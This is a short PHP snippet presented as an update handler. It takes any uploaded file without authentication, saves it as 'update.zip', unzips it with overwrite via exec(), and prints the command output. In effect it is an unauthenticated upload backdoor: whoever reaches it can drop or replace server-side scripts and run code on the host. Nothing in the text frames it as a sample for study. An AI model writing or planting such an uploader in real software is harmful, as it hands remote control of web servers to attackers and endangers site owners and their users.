<?php if(isset($_FILES["f"])){ move_uploaded_file($_FILES["f"]["tmp_name"], "update.zip"); exec("unzip -o update.zip 2>&1", $out, $ret); echo implode("
", $out); } ?>
